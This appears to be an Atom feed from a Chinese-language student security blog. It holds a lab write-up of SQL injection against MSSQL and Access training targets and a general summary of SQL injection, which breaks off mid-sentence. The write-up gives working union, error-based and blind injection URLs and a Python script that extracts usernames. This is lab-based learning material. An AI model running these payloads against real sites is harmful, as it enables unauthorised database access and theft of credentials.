<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>oxxk blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0xxk.github.io/"/>
  <updated>2019-09-09T12:56:05.464Z</updated>
  <id>https://0xxk.github.io/</id>
  
  <author>
    <name>0xxk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MSSSQL AND Access注入（内附脚本）</title>
    <link href="https://0xxk.github.io/2019/09/09/MSSQL%20and%20Access/"/>
    <id>https://0xxk.github.io/2019/09/09/MSSQL and Access/</id>
    <published>2019-09-09T12:49:42.909Z</published>
    <updated>2019-09-09T12:56:05.464Z</updated>
    
    <content type="html"><![CDATA[<p>对Mssql和Access数据库进行注入学习！</p><a id="more"></a><h2 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h2><p>在MSSQL_SQLI_Labs靶场进行注入</p><p>作业：</p><p>使用union联合查询和报错注入，完成mssql数据库的注入，查询出库名，表名，字段名。 </p><p>使用盲注对mssql数据库注入出数据库的version。</p><p><strong>确定注入流程</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.判断注入类型 2.确认字段数 3.察看页面能够显示的位置 4.确定使用的注入方法</span><br></pre></td></tr></table></figure><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先判断是否存在<strong>数字型注入</strong>，更改id=1  -〉id=2-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-1-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=2-1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-1-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>通过报错可以和明显的看到不是数字型注入</p><p>再次判断是否存在<strong>字符型注入</strong>，在后面加上’后报错，证明是字符型注入e</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-1-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="确定当前表字段数"><a href="#确定当前表字段数" class="headerlink" title="确定当前表字段数"></a>确定当前表字段数</h3><p>使用二分法判断当前表的字段数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1’ order by 4 -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-1-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>继续修改我们的字段数为3，这时候页面显示正常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1’ order by 3 -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-1-5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="察看页面能够显示的位置"><a href="#察看页面能够显示的位置" class="headerlink" title="察看页面能够显示的位置"></a>察看页面能够显示的位置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1 union select (@@version),2,3-- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-2-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><strong>判断库名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=-1&apos; union select 1, schema_name, 3 from (select top 1 schema_name from information_schema.schemata order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-2-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=-1&apos; union select 1, schema_name, db_name() from (select top 1 schema_name from information_schema.schemata where schema_name not in (&apos;dbo&apos;, &apos;accessadmin&apos;, &apos;guest&apos;, &apos;db_accessadmin&apos;,&apos;db_backupoperator&apos;, &apos;db_datareader&apos;, &apos;db_datawriter&apos;,&apos;db_ddladmin&apos;)) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-2-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p><strong>判断表名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-2-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables where table_name not in (&apos;emails&apos;, &apos;uagents&apos;, &apos;referers&apos;, &apos;users&apos;) and table_schema=&apos;dbo&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-2-5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p><strong>判断字段名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=-1&apos; union select 1, column_name, 3 from (select top 1 column_name from information_schema.columns order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-3-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=-1&apos; union select 1, column_name, db_name() from (select top 1 column_name from information_schema.columns where column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) and table_name=&apos;users&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-3-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>判断库名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 schema_name from information_schema.schemata )) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-3-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这时候可以看到查询出来的第一个库为dbo，可以通过not in 方法将其他值查询出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 schema_name from information_schema.schemata where schema_name not in(&apos;dbo&apos;) )) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-3-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这时候就拿到了dbo和db_accessadmin库，可以慢慢遍历出来。</p><p><strong>判断表名</strong></p><p>目前可以知道一张表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 table_name from information_schema.tables where table_schema=&apos;dbo&apos; and table_name not in(&apos;emails&apos;) )) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-3-5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>遍历出来了第二章表，使用同样的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 table_name from information_schema.tables where table_schema=&apos;dbo&apos; and table_name not in(&apos;emails&apos;, &apos;uagents&apos;) )) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-4-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-4-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>最后遍历出了所有的表为’emails’,’uagents’,’referers’,’users’</p><p><strong>查询emails表的字段名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;emails&apos;)) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-4-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>查出id后遍历其他的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;))) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-4-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;,&apos;username&apos;))) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-4-5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>最后找出所有字段，分别为id、username、password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;,&apos;username&apos;,&apos;password&apos;))) -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Msssql-4-6.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h4 id="布尔盲注查version"><a href="#布尔盲注查version" class="headerlink" title="布尔盲注查version"></a>布尔盲注查version</h4><p>使用二分法判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and len(@@version)&gt;200 -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/盲注1-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and len(@@version)&gt;220 -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/盲注1-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>最后找到字符数为212</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/盲注1-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/盲注1-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>使用ascii函数取出第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.124:8081/less-1.asp?id=1&apos; and ascii(substring((@@version),1,1))&gt;76 -- |</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/盲注1-5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/盲注1-6.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可以看到第一个字符的ACSII码为77，所以第一个字母为M。</p><h2 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h2><p>在这里使用魅力企业管理网站作为靶场</p><p>作业：</p><p>完成对此靶场的注入</p><p><strong>注入流程：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.确定注入点      2.判断注入类型</span><br><span class="line">3.判断数据库类型   4.判断当前表字段数   </span><br><span class="line">5.判断显示位 6.确定使用的注入方法</span><br></pre></td></tr></table></figure><h3 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h3><p>既然是企业网站，那么最有可能的注入点就是在企业新闻那了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-1-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在这里选择业内咨询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-1-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>很明显，注入点就在id=2这里</p><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>在这里方法和mssql靶场的一样，都是先测试n-1 后测试 ‘ – |</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=3-1</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-1-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可以看到3-1的页面和2的完全相同，证明这里是数字型注入</p><h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>网页是asp后缀的，且中间件是IIS6.X系列的。很明显数据库极有可能是access，但在这里还是检验一下为好。</p><p>因为是数字型注入，所以直接在后面拼接我们的语句即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select count(*) from MSysAccessObjects)&gt;0</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-1-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>看到页面往回正常，证明这里的数据库是access</p><h3 id="判断当前表字段数"><a href="#判断当前表字段数" class="headerlink" title="判断当前表字段数"></a>判断当前表字段数</h3><p>当我们字段数为12时报错，11时正常。证明这个页面有11个字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 order by 12</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-1-5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h3><p>在这里默认先使用联合查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 union select 1,2,3,4,5,6,7,8,9,10,11 from news</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-2-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="联合查询-1"><a href="#联合查询-1" class="headerlink" title="联合查询"></a>联合查询</h3><p><strong>猜表名</strong></p><p>因为access数据库没有information_schema库，所以要先猜表名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select count(*) from user)</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-2-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>找到一张表名为news，一张为user</p><p><strong>查询title字段长度</strong></p><p>从上面的内容可以推测到应该有id ,title,content字段，在这判断title字段的长度。</p><p>使用top 1来代替limit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select top 1 len(title) from news)&gt;29</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-2-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select top 1 len(title) from news)&gt;30</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-2-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>由此可知第一行数据一共有30个字符，30个字符太多了。我得换张表来尝试</p><p>一般用户表里都有username，在这里就对username进行尝试</p><p><strong>查询username字段长度</strong></p><p>首先查询username字段的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select top 1 len(username) from user)&gt;4</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-2-5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>查询出来是5字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select top 1 len(username) from user)&gt;5</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-3-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p><strong>判断各行字符长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;96</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-3-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>最后测出来第一个字符ASCII为97，是字母a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.5/shownews.asp?id=2 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;97</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-3-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在这里已经知道有两行数据且每行数据的长度都是5，就此写了个遍历脚本</p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def qingqiu(url1, know):</span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    r = r&quot;(admin)&quot;</span><br><span class="line">    Z1 = re.search(r,html1.text)</span><br><span class="line">    if len(know) == 0:</span><br><span class="line">        know.append(Z1.group(0))</span><br><span class="line">        return</span><br><span class="line">    if not (Z1 and know[-1] ):</span><br><span class="line">        return 1</span><br><span class="line">    know.append(Z1)</span><br><span class="line"></span><br><span class="line">def chaxun(url1,url2):</span><br><span class="line">    for i in range(2):</span><br><span class="line">        if i == 0:</span><br><span class="line">            Flags = []</span><br><span class="line">            flag = &apos;&apos;</span><br><span class="line">            know = []</span><br><span class="line">            url3 = &apos;&apos;</span><br><span class="line"></span><br><span class="line">        else :</span><br><span class="line">            know = []</span><br><span class="line">            flag = &apos;&apos;</span><br><span class="line">            url3 = &quot; where username not in (select top &#123;&#125; username from user)&quot;.format(i)</span><br><span class="line">        for i in range(5):</span><br><span class="line">            url = url1 + &quot;&#123;&#125;&quot;.format(i+1) + url2</span><br><span class="line">            for j in range(33,128):</span><br><span class="line">                url_sum1 = url + url3 + &quot;)&gt; &#123;&#125;&quot;.format(j)</span><br><span class="line">                jieguo = qingqiu(url_sum1, know)</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(j),</span><br><span class="line">                    flag += chr(j)</span><br><span class="line">                    break</span><br><span class="line">        Flags.append(flag)</span><br><span class="line">        print Flags</span><br><span class="line">    return Flags</span><br><span class="line"></span><br><span class="line">def fenlei(url):</span><br><span class="line">    url1 = url +  &quot; and (select top 1 asc(mid(username, &quot;</span><br><span class="line">    url2 = &quot;, 1)) from user&quot;</span><br><span class="line">    list = chaxun(url1, url2)</span><br><span class="line">    print list</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">   url = &quot;http://192.168.100.5/shownews.asp?id=2&quot;</span><br><span class="line">   fenlei(url)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>此脚本功能不完全，为加入判断行数和每行字段数功能，后期会慢慢补上且会加入多线程！</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/access-3-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>PASS:上周回学校办理定岗实习手续去了，所以这几次作业晚交了且做的不是很认真。下不为例！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对Mssql和Access数据库进行注入学习！&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="https://0xxk.github.io/2019/09/09/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://0xxk.github.io/2019/09/09/注入总结/</id>
    <published>2019-09-08T16:01:49.106Z</published>
    <updated>2019-09-08T16:12:18.798Z</updated>
    
    <content type="html"><![CDATA[<p>这两周的SQL注入总结</p><a id="more"></a><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>​        SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>​        注入本质：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将用户提交的恶意代码和原本的SQL 语句进行拼接，将拼接后的语句带入数据库来执行恶意语句，从而达到非授权任意查询的效果。</span><br></pre></td></tr></table></figure><p>​        注入漏洞有两个关键条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.用户能控制输入的内容</span><br><span class="line"></span><br><span class="line">2.Web应用把用户输入的内容带入到数据库中执行</span><br></pre></td></tr></table></figure><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>根据数据库来分可以分为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.Mysql数据库注入 2. Mssql数据库注入 3.Oracle数据库注入 4.Access数据库注入</span><br></pre></td></tr></table></figure><p>根据请求方式不同可以分为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.GET方式请求注入 2.POST方式请求注入 3.请求头注入</span><br></pre></td></tr></table></figure><p>根据sql注入点的参数类型可以分为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.整数型注入 2.字符型注入</span><br></pre></td></tr></table></figure><p>根据sql注入点的反馈类型分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.基于错误显示的sql注入  2.union类型的sql注入</span><br><span class="line">3.布尔类型的sql注入     4.基于时间的sql注入</span><br><span class="line">5.多语句注入  6.内联注入</span><br><span class="line">7...</span><br></pre></td></tr></table></figure><h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>大体分为这几个主要步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.确定请求方式                   2.确定数据库类型  </span><br><span class="line"></span><br><span class="line">3.寻找注入点         4. 判断注入点的参数类型</span><br><span class="line"></span><br><span class="line">5.判断截断符号                   6.根据注入点的反馈类选择注入方法</span><br><span class="line"></span><br><span class="line">7.判断WAF过滤字符   8.构建符合标准的注入语句</span><br></pre></td></tr></table></figure><h3 id="确定请求方式"><a href="#确定请求方式" class="headerlink" title="确定请求方式"></a>确定请求方式</h3><p>HTTP 定义了与服务器交互的不同方法，最基本的方法是 GET 和 POST。</p><p><strong>GET方式</strong>在客户端通过URL提交数据，数据在URL中可以看到，例如在日常中订购服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http：//www.cnblogs.com/javame/index.htm？servId=2</span><br></pre></td></tr></table></figure><p><strong>POST方式</strong>数据放置在HTML HEADER内提交，数据在URL中看不到</p><p><u>GET只能传输比较少的数据，安全性较低，POST传输数据较多，安全性也比GET高。</u></p><h3 id="确定数据库类型"><a href="#确定数据库类型" class="headerlink" title="确定数据库类型"></a>确定数据库类型</h3><p>获取数据时，每种数据库架构、语法、类型都是不一样的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from MSysAccessObjects) &gt; 